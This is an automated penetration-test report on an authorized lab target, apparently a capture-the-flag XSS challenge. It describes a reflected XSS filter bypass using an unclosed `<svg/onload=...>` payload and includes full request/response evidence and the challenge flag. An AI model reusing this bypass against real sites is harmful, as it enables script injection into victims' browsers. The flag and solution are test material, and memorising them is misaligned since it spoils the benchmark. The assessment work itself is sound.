# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. MEDIUM — xss-reflected Reflected XSS on /page `solution` via tag-strip + space-filter bypass (alert('XSS') executed)](#finding-1)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr30ltz5-j4euru` |
| Target | http://target.local:32832/ |
| Started | 2026-07-02T04:39:10.724Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 1 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32832`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

1 finding(s): 1 medium

## Findings

<a id="finding-1"></a>

### 1. [MEDIUM] [xss-reflected] Reflected XSS on /page `solution` via tag-strip + space-filter bypass (alert('XSS') executed)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32832/

The POST body parameter `solution` on /page is reflected UNESCAPED into the HTML body of a server-rendered document (between the input field and </form>). The server sanitizer applies two naive transforms: (1) it strips complete HTML tags matching a `<...>`-style regex (both `<` and a following `>` required — verified: `<b>hi</b>`->`hi`, `<script>alert('XSS')</script>`->`alert('XSS')`, `<img src=x>`->removed), and (2) it removes whitespace (space, tab, newline all deleted; `/` survives). Both filters are bypassed at once by (a) OMITTING the closing `>` so no complete tag exists for the tag-strip regex to match — the template's own `</form>` later supplies the `>` in the browser — and (b) using `/` instead of a space to separate the tag name from its attributes. Payload: `<svg/onload=alert('XSS')`. The app renders each submission in a headless browser that hooks alert(); the injected `<svg onload>` fires on parse and executes alert('XSS'), confirmed by the server returning the success state (success_star.png, "Congratulations! Here is the flag: flag{77b2f057-5e03-472b-bd38-10297eb53229}"). An `<img/src=x/onerror=alert('XSS')` variant also survives the filter but does NOT fire in the oracle because image loading (and thus onerror) is disabled there — onload-based vectors are required. This is arbitrary JavaScript execution in a victim's browser context.

**Reproduction**

```
POST to http://target.local:32832/page with header `Content-Type: application/x-www-form-urlencoded` and body `solution=%3Csvg%2Fonload%3Dalert('XSS')` (decoded: solution=<svg/onload=alert('XSS') — NO trailing > and a / separator). Response contains success_star.png and "Congratulations! Here is the flag: flag{77b2f057-5e03-472b-bd38-10297eb53229}", proving alert('XSS') executed in the rendering browser. Negative control (ev-mr317b65-18): body `solution=notxss_benign_control` returns error_star / "Oops!" with no flag. Positive replays ev-mr317bii-19 / ev-mr317buu-1a both return "Congratulations". Filter-characterization evidence: ev-mr3118ub-v, ev-mr311ikt-w, ev-mr312dma-10, ev-mr314zdt-11, ev-mr315536-14, ev-mr316kdh-17.
```

**Evidence**

- Evidence `ev-mr317b65-18` — `artifacts/_/ev-mr317b65-18/`

Request:

```http
POST /page HTTP/1.1
Host: target.local:32832
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

solution=notxss_benign_control
```

Response:

```http
HTTP/1.1 200
content-length: 1042
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:55:52 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss24.css">
            <title>Dalgona - Star</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_star.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"</div>
                    <input type=text name=solution placeholder="Enter solution...">
                    notxss_benign_control
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mr317bii-19` — `artifacts/_/ev-mr317bii-19/`

Request:

```http
POST /page HTTP/1.1
Host: target.local:32832
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

solution=%3Csvg%2Fonload%3Dalert('XSS')
```

Response:

```http
HTTP/1.1 200
content-length: 1012
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:55:52 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss24.css">
            <title>Dalgona - Star</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/success_star.png" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: flag{77b2f057-5e03-472b-bd38-10297eb53229}</div>
                    <input type=text name=solution placeholder="Enter solution...">
                    <svg/onload=alert('XSS')
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mr317buu-1a` — `artifacts/_/ev-mr317buu-1a/`

Request:

```http
POST /page HTTP/1.1
Host: target.local:32832
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

solution=%3Csvg%2Fonload%3Dalert('XSS')
```

Response:

```http
HTTP/1.1 200
content-length: 1012
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:55:53 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss24.css">
            <title>Dalgona - Star</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/success_star.png" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: flag{77b2f057-5e03-472b-bd38-10297eb53229}</div>
                    <input type=text name=solution placeholder="Enter solution...">
                    <svg/onload=alert('XSS')
                </form>
            </div>
        </div>
    </html>
```
